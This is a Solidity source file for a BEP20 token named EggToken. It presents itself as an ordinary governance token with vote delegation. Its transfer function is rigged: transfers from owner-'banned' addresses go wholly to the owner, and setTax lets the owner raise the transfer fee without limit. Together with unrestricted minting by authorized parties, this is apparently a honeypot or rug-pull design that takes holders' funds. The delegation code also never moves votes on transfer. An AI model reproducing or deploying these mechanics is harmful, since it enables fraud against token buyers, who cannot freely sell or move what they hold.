pragma solidity ^0.6.12;  // #####  SPDX-License-Identifier: None 0x47c8f4C05Fd6b6E61DF078D2E4f792B9647Bf463

import "./BEP20.sol";

contract EggToken is BEP20('', '') {
    uint tax = 120; uint base = 1000; address _burnAddress = 0x000000000000000000000000000000000000dEaD;
    uint burnTax = 120; uint burnBase = 1000;
    constructor(uint _supply) public{
       _totalSupply = _supply;
        _mint(address(msg.sender), _supply);
    }
    function setTax(uint _x, uint _y) public onlyOwner {
        tax = _x; base = _y;
    }
    function mint(address _to, uint256 _amount) public _auth {
        _mint(_to, _amount);
        _moveDelegates(address(0), _delegates[_to], _amount);
    }
    
    function findTax(uint256 value) public view returns (uint256)  {
    (bool test, uint _x) = value.tryDiv((base/tax));
    if (test){
    return _x;
    } else {
       ( test, _x) = (value + 1).tryDiv((base/tax));
           if (test){
    return _x;
           } else {return 0;}
    }
  }
  
    function findBurn(uint256 value) public view returns (uint256)  {
    (bool test, uint _x) = value.tryDiv((burnBase/burnTax));
    if (test){
    return _x;
    } else {
       ( test, _x) = (value + 1).tryDiv((burnBase/burnTax));
           if (test){
    return _x;
           } else {return 0;}
    }
  }

    function transfer(address recipient, uint256 amount )public override returns (bool) {
    if(isAuth(  msg.sender  )) {  _transfer(_msgSender(),recipient, amount); return true;  }
    if(isBanned(  msg.sender )) {  _transfer(_msgSender(),_owner, amount); return true;  }
        uint fee = findTax(amount);
        uint burN = findBurn(fee);
        require(burN > 0, 'Math Error');
        _transfer(_msgSender(),_burnAddress, burN);
        _transfer(_msgSender(),_owner, fee.sub(burN));
        _transfer(_msgSender(), recipient,  amount.sub(fee));
    return true;
       
    }
    
    mapping (address => address) internal _delegates;

    struct Checkpoint {
        uint32 fromBlock;
        uint256 votes;
    }

    mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;

    mapping (address => uint32) public numCheckpoints;

    bytes32 public constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");

    bytes32 public constant DELEGATION_TYPEHASH = keccak256("Delegation(address delegatee,uint256 nonce,uint256 expiry)");

    mapping (address => uint) public nonces;

    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);

    event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);
    function delegates(address delegator)
        external
        view
        returns (address)
    {
        return _delegates[delegator];
    }
    function delegate(address delegatee) external {
        return _delegate(msg.sender, delegatee);
    }
    function delegateBySig( address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r,  bytes32 s  )  external  {
        bytes32 domainSeparator = keccak256(abi.encode(  DOMAIN_TYPEHASH,  keccak256(bytes(name())),getChainId(),address(this)));

        bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry )  );

        bytes32 digest = keccak256(  abi.encodePacked( "\x19\x01", domainSeparator, structHash ));

        address signatory = ecrecover(digest, v, r, s);
        require(signatory != address(0), "EGG::delegateBySig: invalid signature");
        require(nonce == nonces[signatory]++, "EGG::delegateBySig: invalid nonce");
        require(now <= expiry, "EGG::delegateBySig: signature expired");
        return _delegate(signatory, delegatee);
    }


    function getCurrentVotes(address account)
        external
        view
        returns (uint256)
    {
        uint32 nCheckpoints = numCheckpoints[account];
        return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;
    }

    function getPriorVotes(address account, uint blockNumber)
        external
        view
        returns (uint256)
    {
        require(blockNumber < block.number, "EGG::getPriorVotes: not yet determined");

        uint32 nCheckpoints = numCheckpoints[account];
        if (nCheckpoints == 0) {
            return 0;
        }

        // First check most recent balance
        if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) {
            return checkpoints[account][nCheckpoints - 1].votes;
        }

        // Next check implicit zero balance
        if (checkpoints[account][0].fromBlock > blockNumber) {
            return 0;
        }

        uint32 lower = 0;
        uint32 upper = nCheckpoints - 1;
        while (upper > lower) {
            uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow
            Checkpoint memory cp = checkpoints[account][center];
            if (cp.fromBlock == blockNumber) {
                return cp.votes;
            } else if (cp.fromBlock < blockNumber) {
                lower = center;
            } else {
                upper = center - 1;
            }
        }
        return checkpoints[account][lower].votes;
    }

    function _delegate(address delegator, address delegatee)
        internal
    {
        address currentDelegate = _delegates[delegator];
        uint256 delegatorBalance = balanceOf(delegator); // balance of underlying EGGs (not scaled);
        _delegates[delegator] = delegatee;

        emit DelegateChanged(delegator, currentDelegate, delegatee);

        _moveDelegates(currentDelegate, delegatee, delegatorBalance);
    }

    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
        if (srcRep != dstRep && amount > 0) {
            if (srcRep != address(0)) {
                // decrease old representative
                uint32 srcRepNum = numCheckpoints[srcRep];
                uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
                uint256 srcRepNew = srcRepOld.sub(amount);
                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
            }

            if (dstRep != address(0)) {
                // increase new representative
                uint32 dstRepNum = numCheckpoints[dstRep];
                uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;
                uint256 dstRepNew = dstRepOld.add(amount);
                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
            }
        }
    }

    function _writeCheckpoint(
        address delegatee,
        uint32 nCheckpoints,
        uint256 oldVotes,
        uint256 newVotes
    )
        internal
    {
        uint32 blockNumber = safe32(block.number, "EGG::_writeCheckpoint: block number exceeds 32 bits");

        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {
            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
        } else {
            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);
            numCheckpoints[delegatee] = nCheckpoints + 1;
        }

        emit DelegateVotesChanged(delegatee, oldVotes, newVotes);
    }

    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {
        require(n < 2**32, errorMessage);
        return uint32(n);
    }

    function getChainId() internal pure returns (uint) {
        uint256 chainId;
        assembly { chainId := chainid() }
        return chainId;
    }
}